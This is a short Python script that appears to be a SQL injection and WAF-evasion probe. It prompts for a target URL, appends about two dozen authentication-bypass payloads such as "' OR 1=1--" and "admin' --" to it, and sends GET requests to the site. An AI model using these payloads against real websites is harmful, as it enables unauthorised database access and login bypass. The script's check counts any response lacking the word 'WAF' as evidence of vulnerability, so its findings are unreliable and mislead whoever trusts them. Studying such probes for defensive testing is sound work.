import requests
from termcolor import colored

def test_waf_evasion(target_url):
    print(colored("[*] Testing for WAF evasion on:", "blue"), target_url)
    
    # Define payloads to test for evasion
    payloads = [
        "' OR 1=1--",
        "' OR '1'='1'--",
        "' OR '1'='1'#",
        "' OR '1'='1'/*",
        "' OR '1'='1'\"",
        "' OR 'x'='x",
        "' OR 1=1--",
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*",
        "admin' and '1'='1'--",
        "admin' and '1'='1'#",
        "admin' and '1'='1'/*",
        "admin' OR 1=1--",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "admin' OR '1'='1'/*",
        "admin' OR '1'='1'\"",
        "admin' OR 'x'='x",
        "admin' AND 1=1--",
        "admin' AND '1'='1'--",
        "admin' AND '1'='1'#",
        "admin' AND '1'='1'/*",
        "admin' AND '1'='1'\"",
    ]
    
    vulnerable = False
    for payload in payloads:
        url = target_url + payload
        print(colored("[*] Sending request with payload:", "blue"), payload)
        
        try:
            response = requests.get(url)
            
            # Check if response indicates WAF evasion
            if "WAF" in response.text:
                print(colored("[!] WAF Detected. Target may be protected.", "red"))
            else:
                print(colored("[+] No WAF detected. Target may be vulnerable.", "green"))
                print(colored("[*] Vulnerable payload:", "green"), payload)
                vulnerable = True
        except requests.exceptions.RequestException as e:
            print(colored("[!] Error:", "red"), e)
    
    if not vulnerable:
        print(colored("[*] Target does not appear to be vulnerable.", "yellow"))

def main():
    target_url = input(colored("Enter your target website URL: ", "blue"))
    test_waf_evasion(target_url)

if __name__ == "__main__":
    main()
